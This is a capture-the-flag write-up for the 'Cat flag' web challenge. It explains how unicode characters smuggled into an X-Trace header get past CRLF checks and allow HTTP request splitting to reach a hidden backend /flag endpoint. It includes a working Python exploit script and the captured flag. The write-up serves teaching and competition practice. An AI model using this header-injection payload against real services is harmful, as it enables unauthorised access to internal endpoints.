# Cat flag (web, 60p, 12 solved)

In the challenge we can connect to a website which is split in 2 parts.
There is [frontend](Frontend.java) and [backend](Backend.java).

It's clear that the flag can be served by backend if we request `/flag` endpoint, however we can't query backend directly at all.
We can only send requests to the frontend side.

We can send request with few names and then the frontend will do:

```java
for (int i = 0; i < names.length; i++) {
    String name = names[i].trim();
    URI url = new URI("http://localhost:8085/cat/" + URLEncoder.encode(name, "UTF-8"));
    HttpGet httpget = new HttpGet(url);
    httpget.setHeader("X-Trace", trace);
    String response = httpclient.execute(httpget, responseHandler);
    cats[i] = response;
}
```

We control the names, but we also control the `trace` parameter.
`URLEncoder.encode` is bulletproof, so we can't do anything strange there.
On the other hand `httpget.setHeader("X-Trace", trace);` seems interesting.

If we go into the source code of the library we can notice that there are special checks to prevent passing `\r\n` inside header value.
However, java uses unicode strings!

We can send for example `\xE0\xB4\x8A`, it will bypass the checks for `\r\n` obviously, but it will also be interpreted as proper newline sequence.
This gives us power to inject headers, and even more, we can do request splitting to inject a second request.
We need to send `keep-alive` header to prevent server from closing connection after the first request, and we need to send at least 2 names, so that the frontend will expect another response:

```python
import requests


def main():
    host = "http://catflag.hackable.software:8080"
    url = host + "/cats?traceId=1234\xE0\xB4\x8AConnection: keep-alive\xE0\xB4\x8A\xE0\xB4\x8AGET /flag HTTP/1.0\xE0\xB4\x8A\xE0\xB4\x8A"
    r = requests.post(url, json={"names": ["ala", "ola"]})
    print(r.text)


main()
```

This way we get back `DrgnS{Th1sIsN0tAS3cur1tyBug}`
